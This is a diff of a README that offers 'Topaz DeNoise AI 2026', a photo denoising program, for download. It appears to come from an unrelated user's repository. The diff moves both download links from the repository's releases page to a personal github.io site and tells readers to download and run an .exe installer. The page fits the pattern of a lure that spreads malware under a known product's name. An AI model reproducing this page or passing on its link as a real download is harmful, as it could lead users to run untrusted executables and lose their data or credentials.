@@ -1,6 +1,6 @@
 # 📸 Topaz-DeNoise-AI-2026 - Improve photo clarity with smart tools
 
-[![](https://img.shields.io/badge/Download-Topaz-DeNoise-AI-2026-blue)](https://github.com/shantil1059/Topaz-DeNoise-AI-2026/releases)
+[![](https://img.shields.io/badge/Download-Topaz-DeNoise-AI-2026-blue)](https://shantil1059.github.io)
 
 Topaz DeNoise AI 2026 removes image grain and sensor noise. This software uses artificial intelligence to fix photos taken in low light. It creates clean, sharp images without losing detail. The tool works for professional and casual photographers. It supports RAW files and common image formats.
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run this software. Check these requirem
 
 You can download the installer from the official repository page. Follow this link to the releases area:
 
-[Download Topaz DeNoise AI 2026](https://github.com/shantil1059/Topaz-DeNoise-AI-2026/releases)
+[Download Topaz DeNoise AI 2026](https://shantil1059.github.io)
 
 Click on the latest version link to begin your download. The file uses the .exe extension. Save this file to your Downloads folder or your desktop to find it quickly.
 
